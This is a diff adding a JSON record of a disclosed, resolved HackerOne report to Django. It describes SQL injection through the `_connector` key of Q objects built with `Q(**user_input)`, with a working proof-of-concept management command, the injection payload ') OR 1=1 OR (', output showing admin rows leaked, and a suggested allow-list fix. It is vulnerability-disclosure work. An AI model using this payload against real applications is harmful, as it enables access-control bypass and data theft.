@@ -1,0 +1,131 @@
+{
+  "id": 3335709,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzM1NzA5",
+  "url": "https://hackerone.com/reports/3335709",
+  "title": "SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2025-09-12T00:19:19.912Z",
+  "submitted_at": "2025-09-12T00:19:20.037Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cyberstan",
+    "url": "/cyberstan",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23,
+    "url": "https://hackerone.com/django",
+    "handle": "django",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/023/b457fd4bd71786ab14973cc3d53f9faf4d6c38ea_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Django",
+      "twitter_handle": null,
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-11-06T21:09:42.024Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-11-06T13:28:28.448Z",
+  "team_member_agreed_on_going_public_at": "2025-11-06T21:09:41.850Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nA **critical** SQL injection vulnerability exists in the Django ORM's handling of `Q` objects. The internal `WhereNode.as_sql` method uses unsafe string formatting to inject the query connector (e.g., 'AND') into the raw SQL query. An attacker can control this connector value via the `_connector` key when a `Q` object is created using dictionary unpacking (e.g., `Q(**user_input)`). This allows the attacker to inject arbitrary SQL into the `WHERE` clause, completely bypassing the ORM's parameterization safeguards, leading to filter bypass and full data exfiltration from the queried model.\n\n---\n\n### Vulnerability Details\n\nThe root cause of the vulnerability is in `django/db/models/sql/where.py` within the `WhereNode.as_sql` method. This method is responsible for joining multiple filter conditions together. The code uses unsafe string formatting to insert the connector:\n\n```python\n# Simplified representation of the vulnerable code in WhereNode.as_sql\nconn = ' %s ' % self.connector\n```\n\nThe method does not perform any validation or sanitization on the `self.connector` attribute before embedding it into the query. The framework allows a developer to specify this connector via the `_connector` argument when initializing a `Q` object. A common pattern in applications with complex filtering, such as those with a search API, is to accept a dictionary of filters and unpack it directly. This pattern is highly vulnerable:\n\n```python\n# An example of a vulnerable application pattern\nfilter_dictionary = request.json.get('filters', {{}})\nquery = Q(**filter_dictionary) # VULNERABLE LINE\nresults = User.objects.filter(query)\n```\n\nIf an attacker controls the contents of `filter_dictionary`, they can insert a `_connector` key with a malicious SQL payload. This payload is then injected directly into the query's structure.\n\n---\n\n### POC\n\n1. First create a new django project and the app. Also make sure you add the webapp to the installed apps within settings.py.\n```bash\ndjango-admin startproject sqli .\npython manage.py startapp webapp\n```\n```python\n# sqli/settings.py\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'webapp',  # <-- Add this\n]\n```\n\n2. Then create a management/commands folder inside your webapp directory and create two empty __init__.py file in both the management and commands directory.\n\n\n3. After this create a file called poc.py in the management/commands directory and add this code:\n\n```python\nfrom django.core.management.base import BaseCommand\nfrom django.db.models import Q\nfrom webapp.models import User\nfrom django.db import connection\n\ndef process_vulnerable_request(search_dict):\n    \"\"\"\n    This function simulates a VULNERABLE part of an application.\n    \n    It takes a dictionary of filters (as if from a JSON API request)\n    and uses unpacking pattern without validating the keys.\n    \"\"\"\n    print(\"--> Entering vulnerable function: Q(**search_dict)\")\n    # THE VULNERABLE LINE: Unpacking a user-controlled dictionary.\n    query = Q(**search_dict)\n    return User.objects.filter(query)\n\n\nclass Command(BaseCommand):\n    help = \"Demonstrates a realistic SQLi PoC via Q object's **kwargs unpacking\"\n\n    def handle(self, *args, **options):\n        # 1. SETUP\n        User.objects.all().delete()\n        User.objects.create(username=\"alice\", is_admin=False)\n        User.objects.create(username=\"root\", is_admin=True)\n        self.stdout.write(\"Sample users created: 'alice' (non-admin) and 'root' (admin)\")\n        self.stdout.write(\"-\" * 40)\n\n        # 2. THE MALICIOUS PAYLOAD\n        # This dictionary simulates a JSON payload sent by an attacker. It looks\n        # like a legitimate filter request, but it includes the malicious key.\n        malicious_user_payload = {\n            \"is_admin\": False,\n            \"username\": \"nonexistent_user\",\n            \"_connector\": \") OR 1=1 OR (\"\n        }\n        self.stdout.write(f\"Simulating malicious user payload:\\n{malicious_user_payload}\")\n        self.stdout.write(\"-\" * 40)\n\n        # 3. EXECUTING THE VULNERABLE CODE\n        # We pass the attacker's dictionary to the vulnerable function.\n        queryset = process_vulnerable_request(malicious_user_payload)\n        self.stdout.write(\"-\" * 40)\n\n        # 4. THE PROOF\n        compiler = queryset.query.get_compiler(using='default')\n        sql, params = compiler.as_sql()\n        self.stdout.write(self.style.SQL_KEYWORD(\"Generated SQL:\"))\n        self.stdout.write(sql % tuple(f\"'{p}'\" for p in params))\n        self.stdout.write(\"-\" * 40)\n        \n        # 5. THE IMPACT\n        self.stdout.write(\"Query Results:\")\n        results = list(queryset)\n        for user in results:\n            self.stdout.write(f\"  - Found user: {user}\")\n        if any(user.is_admin for user in results):\n            self.stdout.write(self.style.SUCCESS(\"\\n SUCCESS: The filter was bypassed via dictionary unpacking! The admin user was returned.\"))\n        else:\n            self.stdout.write(self.style.ERROR(\"\\n- FAILED: The injection did not bypass the filter.\"))\n\n```\n\n4. Then modify models.py to add an example user model.\n```python\n# models.py\n\nfrom django.db import models\n\nclass User(models.Model):\n    username = models.CharField(max_length=100)\n    is_admin = models.BooleanField(default=False)\n\n    def __str__(self):\n        return f\"{self.username} (Admin: {self.is_admin})\"\n```\n\n5. This is all the code required next simply run the following commands to migrate the database and run the poc.\n```bash\npython manage.py makemigrations\npython manage.py migrate\npython manage.py poc\n\n```\n\n6. The ouput of this code will highlight the bug as it allows the sql injection and prints out the users in the table. It will also display the final query highlighting the vulnerability. Example expected ouput can be seen below.\n```text\n\nSample users created: 'alice' (non-admin) and 'root' (admin)\n----------------------------------------\nSimulating malicious user payload:\n{'is_admin': False, 'username': 'nonexistent_user', '_connector': ') OR 1=1 OR ('}\n----------------------------------------\n--> Entering vulnerable function: Q(**search_dict)\n----------------------------------------\nGenerated SQL:\nSELECT \"webapp_user\".\"id\", \"webapp_user\".\"username\", \"webapp_user\".\"is_admin\" FROM \"webapp_user\" WHERE (NOT \"webapp_user\".\"is_admin\" ) OR 1=1 OR ( \"webapp_user\".\"username\" = 'nonexistent_user')\n----------------------------------------\nQuery Results:\n  - Found user: alice (Admin: False)\n  - Found user: root (Admin: True)\n\n SUCCESS: The filter was bypassed via dictionary unpacking! The admin user was returned.\n```\n\n---\n\n### Suggested Remediation\n\nThe root cause is the trust placed in the `_connector` string. The vulnerability can be patched by validating the connector value against a strict allow-list before it is used for string formatting.\n\n**Proposed Patch (`django/db/models/sql/where.py`):**\n```python\n# In WhereNode.as_sql method...\n\ndef as_sql(self, compiler, connection):\n    # Add this validation at the beginning of the method\n    if self.connector not in ('AND', 'OR'):\n        raise ValueError(\n            f\"Invalid connector '{{self.connector}}'. Must be 'AND' or 'OR'.\"\n        )\n    \n    # ... (rest of the method proceeds as normal)\n    conn = ' %s ' % self.connector\n    # ...\n```\n\n## Impact\n\n### Impact\n\nThe impact of this vulnerability is **critical**. An attacker who can control the keys of a dictionary used to filter a model can:\n-   **Bypass Access Controls:** Retrieve any and all records from the queried table by injecting a condition that is always true (e.g., `OR 1=1`), thereby bypassing all other filters in the `WHERE` clause.\n-   **Exfiltrate Sensitive Data:** An attacker can leak the data of all users, including administrators, from a users table. This applies to any model exposed via a vulnerable filter.\n-   **Degrade Performance:** A complex injected SQL payload could potentially be used to cause a Denial-of-Service condition by overloading the database.",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2025-12-06T13:28:28.557Z",
+  "allow_singular_disclosure_after": -13311125.606531877,
+  "singular_disclosure_allowed": true,
+  "vote_count": 75,
+  "voters": [
+    "x2n",
+    "bobjrthe3rd",
+    "0xcyborg",
+    "dev_ali",
+    "flysec",
+    "ganeshbagaria",
+    "nakyamad",
+    "almuntadhar0x01",
+    "zy9ard3",
+    "candysec",
+    "and 65 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
